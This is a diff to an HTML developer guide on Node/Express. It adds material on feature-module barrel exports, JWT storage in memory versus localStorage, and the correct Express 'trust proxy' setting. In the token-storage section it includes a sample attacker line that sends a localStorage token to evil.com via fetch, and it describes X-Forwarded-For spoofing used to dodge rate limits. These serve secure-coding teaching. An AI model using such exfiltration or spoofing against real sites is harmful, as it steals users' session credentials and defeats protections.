@@ -172,6 +172,8 @@ td{padding:5px 8px;border-bottom:0.5px solid var(--color-border-tertiary);color:
 .th { font-size: 11px; font-weight: 500; fill: var(--color-text-primary); font-family: system-ui, sans-serif; }
 .ts { font-size: 10px; fill: var(--color-text-secondary); font-family: system-ui, sans-serif; }
 .arr { fill: none; stroke-width: 1; }
+
+/*
 .c-blue rect, .c-blue circle { fill: var(--color-background-info); stroke: var(--color-border-info); }
 .c-blue text { fill: var(--color-text-info); }
 .c-purple rect, .c-purple circle { fill: #f3f0fd; stroke: #c4b5f8; }
@@ -182,6 +184,37 @@ td{padding:5px 8px;border-bottom:0.5px solid var(--color-border-tertiary);color:
 .c-gray text { fill: var(--color-text-secondary); }
 .c-amber rect, .c-amber circle { fill: var(--color-background-warning); stroke: var(--color-border-warning); }
 .c-amber text { fill: var(--color-text-warning); }
+*/
+
+/* Colour chip: blue — routers, API boxes, info-tone elements */
+.c-blue rect, .c-blue circle { fill: var(--color-background-info); stroke: var(--color-border-info); }
+.c-blue text { fill: var(--color-text-info); }
+
+/* Colour chip: purple — controllers, auth, decisions */
+.c-purple rect, .c-purple circle { fill: #f3f0fd; stroke: #c4b5f8; }
+.c-purple text { fill: #5b21b6; }
+
+/* Colour chip: teal — services, Google/provider boxes */
+.c-teal rect, .c-teal circle { fill: #f0fdfa; stroke: #99e6d8; }
+.c-teal text { fill: #0f766e; }
+
+/* Colour chip: gray — neutral / HTTP request boxes */
+.c-gray rect, .c-gray circle { fill: var(--color-background-secondary); stroke: var(--color-border-tertiary); }
+.c-gray text { fill: var(--color-text-secondary); }
+
+/* Colour chip: amber — warnings, rate limits */
+.c-amber rect, .c-amber circle { fill: var(--color-background-warning); stroke: var(--color-border-warning); }
+.c-amber text { fill: var(--color-text-warning); }
+
+/* ── Dark mode overrides for SVG classes ─────────────────── */
+@media (prefers-color-scheme: dark) {
+  .c-purple rect, .c-purple circle { fill: #1e1530; stroke: #6d4faa; }
+  .c-purple text { fill: #c4a8f5; }
+
+  .c-teal rect, .c-teal circle { fill: #0d2622; stroke: #2a7a6e; }
+  .c-teal text { fill: #5ecfbf; }
+}
+
 </style>
 
 <div class="shell">
@@ -818,12 +851,32 @@ import { ordersRouter } from './features/orders/index.js'
 
 // Another feature needing the Order type
 import type { Order } from './features/orders/index.js'</pre>
+
 <h3>The barrel — selective, editorial</h3>
 <pre>// features/orders/index.ts
 export { ordersRouter } from './orders.router.js'
 export type { Order, CreateOrderInput } from './orders.schema.js'
 
-// NOT exported: service, controller, repository, schema internals</pre>
+// NOT exported: service, controller, repository, schema internals
+// They are implementation details. If the invoices feature wants
+// to fetch an order, it should call the orders API — not import
+// directly from orders.service.ts</pre>
+
+<h3>Why this boundary matters in practice</h3>
+<p>The barrel isn't bureaucracy — it's the mechanism that lets you refactor a feature's internals without breaking the rest of the codebase. Consider what happens without it.</p>
+<p>The <code>invoices</code> feature needs to fetch an order to build an invoice. A developer takes the path of least resistance and imports directly from the orders feature's internals:</p>
+<pre>// features/invoices/invoices.service.ts
+// Reaches directly into orders internals — seems harmless
+import { getOrderById } from '../orders/orders.service.js'</pre>
+<p>This works fine until you refactor the orders feature. You split <code>orders.service.ts</code> into <code>orders.query.service.ts</code> and <code>orders.mutation.service.ts</code> to separate read and write concerns. The function still exists — it just moved. But now the invoices feature is broken, and so is any other feature that imported directly. You have to track down every import across the codebase and update it. The refactor that should have been internal to the orders feature has become a cross-cutting change.</p>
+<pre>// With the barrel enforced — invoices only sees the public API
+import { getOrderById } from '../orders/index.js'
+
+// Now you can restructure orders internals freely.
+// As long as index.ts continues to export getOrderById,
+// invoices is unaffected. The refactor stays local.</pre>
+<p>The discipline is: if you find yourself writing an import that reaches past an <code>index.ts</code> into a feature's internal files, stop. Either the thing you need should be added to that feature's public API, or your feature shouldn't be depending on it at all — it should go through a service call or a shared <code>lib/</code> utility instead.</p>
+<div class="tip">A useful rule of thumb: only export from <code>index.ts</code> what you'd be comfortable treating as a stable, versioned interface — something you'd have to write a migration or a deprecation notice to change. The router (always), public types (usually), and occasionally a service method for legitimate inter-feature calls. Never controllers, never internal helpers, never repository functions.</div>
 </div>
 
 <div id="tab-classes" class="tab">
@@ -1466,6 +1519,38 @@ execFile('convert', [sanitizedFilename, 'output.png'])</pre>
 <div class="do"><div class="t">Layer 2 — output escaping</div><p>Template engines (Handlebars, EJS, Nunjucks) auto-escape output by default. Treat any unescaped output tag as a deliberate decision requiring code review justification.</p></div>
 <div class="do"><div class="t">Layer 3 — CSP with nonces</div><p>Even if malicious content is stored and rendered, a correctly configured CSP with nonces prevents it from executing.</p></div>
 <div class="do"><div class="t">Layer 4 — httpOnly cookies</div><p>Refresh tokens in httpOnly cookies are inaccessible to JavaScript entirely. A successful XSS attack can't steal the refresh token.</p></div>
+
+<h3>Token storage — the localStorage trap</h3>
+<p>The most common advice for storing JWTs in a browser is "use localStorage." It's also wrong from a security standpoint. The reason comes down to what XSS actually gives an attacker access to.</p>
+<p>Any JavaScript running on your page — including third-party analytics scripts, ad scripts, CDN-hosted libraries, and any injected malicious code — can read <code>localStorage</code> unconditionally. There is no same-origin protection for <code>localStorage</code> reads within the same origin. A single compromised dependency in your frontend bundle, or a single stored XSS vulnerability anywhere on your domain, gives an attacker the ability to silently exfiltrate every token stored there. They don't need to be running in your app's code — they just need to be running on the same origin.</p>
+<pre>// VULNERABLE — any XSS on your domain exposes this immediately,
+// including XSS in a third-party script you loaded via npm or CDN
+localStorage.setItem('access_token', token)
+
+// Attacker's injected or compromised script:
+fetch('https://evil.com?t=' + localStorage.getItem('access_token'))
+// Silent. Instant. Requires no interaction from the user.
+// The attacker now has a valid token they can use from anywhere.</pre>
+<pre>// SAFE — access token lives in a JS module-scoped variable
+// It is gone on page reload, but that is the intended behaviour.
+// XSS running in the same session can theoretically read it,
+// but cannot exfiltrate it silently across sessions or page reloads.
+let accessToken: string | null = null
+
+// On login:
+accessToken = response.data.accessToken
+
+// On page reload — silently refresh using the httpOnly cookie:
+// POST /auth/refresh is called on app init.
+// The browser sends the httpOnly cookie automatically.
+// You get a new access token back in the response body.
+// The user never notices.
+
+// On every API request:
+headers: { Authorization: `Bearer ${accessToken}` }</pre>
+<div class="tip">The refresh token in an httpOnly cookie is the backstop. Even if the access token is somehow read from memory during an active XSS attack, the refresh token — the long-lived credential — is completely inaccessible to JavaScript. <code>httpOnly</code> means the browser will never expose the cookie value to any script, regardless of origin or circumstances.</div>
+<div class="warn">This pattern means users are "logged out" on page refresh until the silent token refresh completes. Design your app's loading state to account for this — show a loading indicator while the refresh is in flight rather than immediately redirecting to login.</div>
+
 <h3>DOM sinks — never pass user data to these</h3>
 <pre>element.innerHTML   = userInput   // DANGEROUS — parses and executes HTML/JS
 eval(userInput)                   // DANGEROUS
@@ -1592,14 +1677,28 @@ RUN npm run build
 
 USER appuser
 CMD ["node", "dist/index.js"]</pre>
+
 <h3>trust proxy — get it exactly right</h3>
-<pre>// WRONG — allows attackers to spoof X-Forwarded-For
+<p>This is one of the most commonly misconfigured Express settings, and the consequences are security-relevant, not just operational. The setting tells Express how many proxy hops to trust when reading the <code>X-Forwarded-For</code> header — which is how <code>req.ip</code> gets its value.</p>
+<pre>// WRONG — trusts the entire X-Forwarded-For chain unconditionally
 app.set('trust proxy', true)
 
-// CORRECT — set to the exact number of proxy hops
+// An attacker can now send:
+// X-Forwarded-For: 1.2.3.4
+// Express sets req.ip = '1.2.3.4' — a completely fabricated address
+// Your IP-based rate limiter is now trivially bypassable:
+// every request appears to come from a different IP
+
+// CORRECT — set to the exact number of proxy hops between
+// the internet and your Node process
 // Internet → Nginx → Node: set to 1
-app.set('trust proxy', 1)</pre>
-<div class="danger">Setting <code>trust proxy: true</code> unconditionally trusts the entire <code>X-Forwarded-For</code> chain. An attacker can spoof any IP address, bypassing all IP-based rate limiting.</div>
+app.set('trust proxy', 1)
+
+// Internet → Cloudflare → Nginx → Node: set to 2
+app.set('trust proxy', 2)</pre>
+<p>The attack this enables when misconfigured: an attacker targeting your login endpoint sends a unique fabricated IP in every request. Your rate limiter keys by <code>req.ip</code> — it sees a different IP each time and never triggers. The brute force limit you carefully configured provides zero protection. Setting the exact hop count means Express only trusts the last N hops of the forwarded chain, which your own infrastructure controls.</p>
+<div class="danger">Setting <code>trust proxy: true</code> unconditionally trusts the entire <code>X-Forwarded-For</code> chain. Since any client can send arbitrary values in that header, this allows complete IP spoofing — bypassing all IP-based rate limiting and any geo-restriction logic that relies on <code>req.ip</code>.</div>
+
 <h3>Server timeout configuration</h3>
 <pre>server.headersTimeout   = 20_000
 server.requestTimeout   = 30_000
